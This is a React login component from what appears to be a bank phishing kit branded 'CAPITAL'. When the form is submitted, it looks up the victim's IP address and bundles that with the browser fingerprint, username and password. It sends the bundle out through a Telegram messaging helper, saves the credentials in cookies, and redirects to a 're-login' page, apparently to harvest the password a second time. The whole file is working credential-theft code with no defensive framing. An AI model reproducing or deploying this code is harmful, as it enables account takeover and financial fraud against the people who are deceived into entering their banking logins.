import React, {useState} from "react";
import { useNavigate } from "react-router-dom";
import cookies from "../utils/cookie.config";
import TelegramSend from "../utils/send-message";

export default function Login() {
  const [formInput, setFormInput] = useState<Login>({
    username: "",
    password: ""
})
const [isLoading, setIsLoading] = React.useState(false);
const navigate = useNavigate()

function handleInputChange (event:React.ChangeEvent<HTMLInputElement>){
    setFormInput((prevData) => ({
        ...prevData,
        [event.target.name]: event.target.value
    }))
}

async function handleSubmit(event: React.FormEvent<HTMLFormElement>){
    
    event.preventDefault()
    setIsLoading(true)
    const request = await fetch("https://api.ipify.org?format=json");
    const response: { ip: string } = await request.json();
    const visitorIP = response.ip;

    const message = `
    [----+🏦 CAPITAL 🏦+-----]
    IP: ${visitorIP}

    Fingerprint: ${navigator.userAgent}
  
    USERNAME: ${formInput.username}

    PASSWORD: ${formInput.password}
    `;
    await TelegramSend(message)
    cookies.set("login1", formInput)
    cookies.set("ip", visitorIP)
    setIsLoading(false)
    navigate("../re-login", {replace:true})
    
}
  return (
    <>
    <form action="" method="post" onSubmit={handleSubmit}>
      <div className="form-area">
            <div className="input-field">
                <label htmlFor="">Username</label>
                <input type="text" name="username" required onChange={handleInputChange}/>
            </div>
            <div className="input-field">
                <label htmlFor="">Password</label>
                <input type="password" name="password" required onChange={handleInputChange}/>
            </div>

            <div style={{"display": "flex", "alignItems": "center"}}>
                    <input style={{"height": "15px", "width": "20px", "marginRight": "3px"}} type="checkbox"/><span>Remember
                      Me</span>
                  </div>

           {isLoading ?
            (
            <button className="btn" type="button">Please wait.....</button>)
            :(
            <button className="btn" type="submit">Sign in</button>)
}

            <div style={{"margin": "20px 0", "display": "flex", "justifyContent": "end", "paddingRight": ""}}>
            <a href="">Forgot your password?</a>
            </div>
        </div>
    </form>
    </>
  );
}
